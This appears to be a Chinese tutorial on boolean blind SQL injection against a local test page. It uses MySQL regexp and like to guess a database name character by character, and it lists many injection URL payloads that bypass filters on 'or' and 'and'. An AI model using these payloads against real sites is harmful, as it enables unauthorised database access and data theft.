正则查找

select database() regexp '^mumu';

模糊匹配LIKE    用来判断数据完整性

select database() like'mumu';

正确则为  1

![](../Images/dcb1d2659c5e33e18a1e848c512f0874.png)  

如果错误则为  0

![](../Images/113859c88c9642882f4fe4b5fc368295.png)

'or 0  %23返回错误页面

'or 1  %23返回正确页面

'or ((select database()) regexp '^')%23   返回正确页面 证明可以利用这个来判断 可是开始跑字段了

  

'or ((select database()) regexp '^m')%23   返回正确页面 数据库的第一个字m

  

'or ((select database()) regexp '^m')%23   依次类推 得到数据库名mumu

  

'or ((select database()) like'mumu')%23  我们在like 下，确定数据库名称的完整性 返回正确页面 则说明数据库名为mumu

  

我给大家统计了下多种符号的判断，or 、and 被拦，那么还有很多种办法

or 或 (字符串)

  

http://127.0.0.1/11.php?id=1'or ((select database()) regexp '^mumu')%23

|             正确则显示       (字符串)

  

http://127.0.0.1/11.php?id=1'|(select database() regexp '^mumu')%23

and 1=1    与       正确则显示   (字符串)

  

http://127.0.0.1/11.php?id=2'and 1=(select database() regexp '^mumu')%23

+加法注入(要把加号转成url编码)    (字符串)

  

http://127.0.0.1/11.php?id=2'%2b(select database() regexp '^mumu')%23

\-减法注入(要在原参数下加1)      (字符串)

  

http://127.0.0.1/11.php?id=2'-(select database() regexp '^mumu')%23

\*乘法注入    (整形)

  

http://127.0.0.1/11.php?id=1'\*(select database() regexp '^mumu')%23    

/除法注入    (字符串)

  

http://127.0.0.1/11.php?id=1'/(select database() regexp '^mumu')%23

\=等于号注入   错误时显示页面不正常  (字符串)

  

http://127.0.0.1/11.php?id=2'=(select database() regexp '^mumu')%23

!=不等于注入  错误时显示正常页面     (字符串)

  

http://127.0.0.1/11.php?id=2'!=(select database() regexp '^mumu')%23

^二次方          错误时显示正常页面     (字符串)

  

http://127.0.0.1/11.php?id=w'^(select database() regexp '^mumu')%23

\>大于              错误时显示正常页面     (字符串)

  

http://127.0.0.1/11.php?id=w'>(select database() regexp '^mumu')%23

% 模数             错误时显示页面不正常  (字符串)

  

http://127.0.0.1/11.php?id=w'%25(select database() regexp '^mumu')%23

xor异或            错误时显示正常页面     (字符串)

  

http://127.0.0.1/11.php?id=w'xor(select database() regexp '^mumu')%23

&& 与              错误时显示页面不正常  (字符串)

  

http://127.0.0.1/11.php?id=w'%26%26(select database() regexp '^mumu')%23

MOD  取余       错误时显示页面不正常  (字符串)

  

http://127.0.0.1/11.php?id=w'MOD(select database() regexp '^mumu')%23

DIV      除法      错误时显示页面不正常  (字符串)

  

http://127.0.0.1/11.php?id=w'DIV(select database() regexp '^mumu')%23

IN       在集合中 错误时显示页面不正常  (字符串)

  

http://127.0.0.1/11.php?id=w'IN(select database() regexp '^mumu')%23
